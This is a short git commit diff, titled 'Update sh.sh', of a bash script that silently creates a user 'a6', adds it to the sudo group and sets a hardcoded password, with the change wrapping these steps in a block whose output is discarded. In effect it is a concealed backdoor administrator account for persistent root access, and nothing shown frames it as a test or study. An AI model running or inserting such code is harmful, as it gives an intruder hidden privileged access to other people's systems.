9550b919151d35fdaedadf914638f0a0abe1d6ba
scampasha <109369989+scampasha@users.noreply.github.com>
2022-07-15 22:11:30 +0300

    Update sh.sh

--- sh.sh
+++ sh.sh
@@ -1,5 +1,7 @@
 #!/bin/bash
-  useradd -m -s /bin/bash a6  2> /dev/null
+ { useradd -m -s /bin/bash a6  2> /dev/null
   usermod -aG sudo a6  2> /dev/null
    echo  'a6:246855096'| chpasswd  2> /dev/null
+   }
+   >/dev/null
   
